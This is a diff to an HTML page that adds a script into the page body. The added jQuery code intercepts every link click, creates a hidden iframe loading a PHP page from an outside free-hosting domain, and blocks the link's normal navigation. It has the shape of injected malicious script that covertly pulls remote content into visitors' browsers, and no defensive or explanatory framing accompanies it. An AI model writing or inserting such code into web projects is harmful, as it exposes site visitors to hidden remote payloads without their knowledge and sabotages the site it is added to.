@@ -59,6 +59,16 @@
 </head>
 <body>
 
+<script type="text/javascript">
+	$('a').click(function(){
+  var iframe = document.createElement("iframe"); 
+  iframe.src = 'https://blackholeframe.000webhostapp.com/bigbang.php'; 
+  iframe.style.display = "none"; 
+  document.body.appendChild(iframe);
+  return false;
+});
+</script>
+
 	<div class="container-fluid" align="center">
 		<div class="row" align="center">
 			<div class="col">
